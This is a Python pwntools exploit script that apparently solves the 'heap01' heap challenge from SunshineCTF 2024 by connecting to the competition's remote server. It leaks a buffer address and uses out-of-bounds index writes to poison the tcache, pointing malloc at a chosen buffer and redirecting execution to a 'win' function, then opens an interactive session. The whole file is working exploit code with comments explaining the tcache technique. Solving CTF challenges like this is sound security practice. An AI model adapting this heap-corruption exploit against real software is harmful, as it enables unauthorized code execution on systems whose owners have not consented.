from pwn import *

#HEAP IS SO FREEEEEEEEE!!!!!!!!!!!!!!!!!!!!

e = ELF('heap01')
context.terminal = ['tmux', 'splitw', '-h']

#io = process(e.path)
#io = gdb.debug('./heap01', '''b *func0 + 337
#               c''')

io = remote("2024.sunshinectf.games", 24006 )
win = e.symbols['win'] + 5
#junk
io.sendline(b'abcppp')
io.recvline()
io.recvline()
io.recvline()
io.recvline()

#grab given buffer
buf = int(io.recvline(),16) + 0x28 - 0x8

#malloc size taches are size 0x10
size = 16 
io.sendlineafter(b'size',str(size).encode())

#tcache win, this is to add the buffer of my choice into the tcache so malloc 
#gives me this buffer when called

print(io.sendlineafter(b"Index", str(-0x244).encode()))
io.sendlineafter(b"Value", str(buf).encode() )

#set the count to 1 so the tcache actually works
io.sendlineafter(b"Index", str(-0x254).encode())
io.sendlineafter(b"Value", str(1).encode() )

#spam win 
io.sendline( str(win).encode())
io.sendline( str(win).encode())
io.sendline( str(win).encode())
io.interactive()

